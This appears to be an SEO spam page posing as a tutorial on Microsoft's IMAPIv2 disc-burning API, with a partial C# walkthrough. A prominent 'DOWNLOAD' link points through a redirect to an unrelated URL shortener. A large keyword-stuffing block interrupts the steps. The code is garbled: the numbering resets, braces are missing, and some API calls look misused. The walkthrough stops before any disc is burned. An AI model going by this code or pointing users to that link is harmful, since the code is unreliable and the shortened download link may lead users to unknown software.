# What is Image Mastering API V2.0 (IMAPIv2.0) and how to use it?
 
Image Mastering API V2.0 (IMAPIv2.0) is a Microsoft Windows API that enables applications to stage and burn images to CD, DVD, and Blu-ray optical storage media. It also supports other disc-like media that lay images in the same manner.
 
**DOWNLOAD ✸✸✸ [https://www.google.com/url?q=https%3A%2F%2Fblltly.com%2F2uJMkE&sa=D&sntz=1&usg=AOvVaw349oiJ8WKBslSiFHvB-4wn](https://www.google.com/url?q=https%3A%2F%2Fblltly.com%2F2uJMkE&sa=D&sntz=1&usg=AOvVaw349oiJ8WKBslSiFHvB-4wn)**


 
IMAPIv2.0 was released on June 26, 2007 for Windows XP and Windows Server 2003 as an update package[^2^]. It is supported natively starting with Windows Vista and Windows Server 2008[^1^].
 
To use IMAPIv2.0, you need to have a compatible optical drive and media, and install the appropriate update package for your operating system. You also need to have some knowledge of CD, DVD, and Blu-ray technologies and file systems.
 
IMAPIv2.0 provides a set of interfaces and programming elements that allow developers to create applications that can stage and burn images to optical media. You can use C/C++, C#, Visual Basic, or VBScript to write your applications using IMAPIv2.0[^1^].
 
Some of the key features of IMAPIv2.0 are:
 
- Support for CD-R, CD-RW, DVD-R, DVD-RW, DVD+R, DVD+RW, DVD-RAM, DVD+R DL (Double Layer), BD-R (Blu-ray Disc Recordable), and BD-RE (Blu-ray Disc Rewritable) media types.
- Support for ISO 9660, Joliet, UDF 1.02, UDF 1.50, UDF 2.00, UDF 2.01, and UDF 2.50 file systems.
- Support for bootable discs, multisession discs, and mixed-mode discs.
- Support for staging files from multiple sources, including local files, network files, streams, and memory buffers.
- Support for verifying the integrity of the staged image before burning.
- Support for event-driven progress notification and cancellation.
- Support for querying the capabilities and features of the optical drive and media.

For more information about IMAPIv2.0, you can refer to the following resources:

1. [Image Mastering API (IMAPI.h) - Win32 apps | Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/imapi/portal)
2. [Description of the Image Mastering API v2.0 (IMAPIv2.0) update package that is dated June 26, 2007 - Microsoft Support](https://support.microsoft.com/en-us/topic/description-of-the-image-mastering-api-v2-0-imapiv2-0-update-package-that-is-dated-june-26-2007-64617ec9-7b94-3aad-c64f-64bd1a70a1b3)
3. [Description of the Image Mastering API v2.0 (IMAPIv2.0) update package that is dated June 26, 2007 - Microsoft Knowledge Base](https://mskb.pkisolutions.com/kb/932716)

## How to write a simple application using IMAPIv2.0?
 
In this section, we will show you how to write a simple application using IMAPIv2.0 that can stage and burn an ISO image to a CD-R disc. We will use C# as the programming language and Visual Studio as the development environment.
 
Before you start, make sure you have the following prerequisites:

- A compatible optical drive and a blank CD-R disc.
- The IMAPIv2.0 update package installed on your Windows XP or Windows Server 2003 machine, or a Windows Vista or Windows Server 2008 machine.
- An ISO image file that you want to burn to the disc.
- Visual Studio 2005 or later installed on your machine.

Follow these steps to create and run the application:
 
Image Mastering API v2.0 for Windows XP,  Image Mastering API v2.0 for Windows Server 2003,  Image Mastering API v2.0 update package KB932716,  Image Mastering API v2.0 download,  Image Mastering API v2.0 burn CD/DVD/Blu-ray,  Image Mastering API v2.0 tutorial,  Image Mastering API v2.0 documentation,  Image Mastering API v2.0 examples,  Image Mastering API v2.0 C# code,  Image Mastering API v2.0 VB.NET code,  Image Mastering API v2.0 PowerShell script,  Image Mastering API v2.0 error,  Image Mastering API v2.0 missing dll,  Image Mastering API v2.0 vs IMAPI 1.0,  Image Mastering API v2.0 benefits,  Image Mastering API v2.0 features,  Image Mastering API v2.0 prerequisites,  Image Mastering API v2.0 restart requirement,  Image Mastering API v2.0 file information,  Image Mastering API v2.0 cdrom.sys,  Image Mastering API v2.0 imapi2.dll,  Image Mastering API v2.0 imapi2fs.dll,  Image Mastering API v2.0 MMC commands,  Image Mastering API v2.0 optical storage media,  Image Mastering API v2.0 disc-like media,  Image Mastering API v2.0 developer audience,  Image Mastering API v2.0 run-time requirements,  Image Mastering API v2.0 what's new,  Image Mastering API v2.0 about IMAPI,  Image Mastering API v2.0 using IMAPI,  Image Mastering API v2.0 IMAPI reference,  Image Mastering API v2.0 additional resources,  Image Mastering API v2.0 Microsoft Optical Storage Blog,  Image Mastering API v2.0 Optical Platform Discussion Forum,  Image Mastering API v2.0 T10 Technical Committee,  Image Mastering API v2.0 Optical Storage Technology Association (OSTA),  Image Mastering API v2.0 ISO image creation,  Image Mastering API v2.0 ISO image verification,  Image Mastering API v2.0 ISO image burning,  Image Mastering API v2.0 ISO image extraction,  Image Mastering API v2.0 bootable disc creation,  Image Mastering API v2.0 bootable disc verification,  Image Mastering API v2.0 bootable disc burning,  Image Mastering API v2.0 bootable disc extraction,  Image Mastering API v2.0 UDF file system support ,  Image Mastering API v2.0 Joliet file system support ,  Image Mastering API v2.0 ISO 9660 file system support ,  Image Mastering API v2.0 IFileSystemImage interface ,  Image Mastering IDiscFormatData interface

1. Open Visual Studio and create a new Windows Forms Application project. Name it IMAPIv2Demo.
2. Add a reference to the IMAPIv2 interop assembly by right-clicking on the References node in the Solution Explorer and selecting Add Reference. In the COM tab, find and select Microsoft IMAPI2 v1.0 Type Library and click OK.
3. Add a button control to the form and name it btnBurn. Change its Text property to Burn Image.
4. Double-click on the button control to generate its click event handler in the code-behind file.
5. In the click event handler, add the following code to create an instance of the MsftDiscMaster2 class, which represents a collection of optical drives on the system:

    // Create an instance of MsftDiscMaster2
    MsftDiscMaster2 discMaster = new MsftDiscMaster2();

1. Add the following code to check if there is at least one optical drive on the system and if it supports recording:

    // Check if there is at least one optical drive
    if (discMaster.Count == 0)
    
        MessageBox.Show("No optical drives found.");
        return;

    // Check if the first drive supports recording
    string uniqueRecorderId = discMaster[0];
    MsftDiscRecorder2 discRecorder = new MsftDiscRecorder2();
    discRecorder.InitializeDiscRecorder(uniqueRecorderId);
    if (!discRecorder.SupportedFeaturePages.Contains(IMAPI_FEATURE_PAGE_TYPE.IMAPI_FEATURE_PAGE_TYPE_PROFILE_LIST))
    
        MessageBox.Show("The drive does not support recording.");
        return;

1. Add the following code to create an instance of the MsftFileSystemImage class, which represents an ISO image file system:

    // Create an instance of MsftFileSystemImage
    MsftFileSystemImage fileSystemImage = new MsftFileSystemImage();
    fileSystemImage.ChooseImageDefaultsForMediaType(IMAPI_MEDIA_PHYSICAL_TYPE.IMAPI_MEDIA_TYPE_CDR);

1. Add the following code to specify the path of the ISO image file that you want to burn to the disc. You can change this path according to your own file location:

    // Specify the path of the ISO image file
    string isoPath = @"C:\Temp\test.iso";

1. Add the following code to load the ISO image file into the file system object:

    // Load the ISO image file into the file system object
    fileSystemImage.Root.AddTree(isoPath, false);

 8cf37b1e13
 
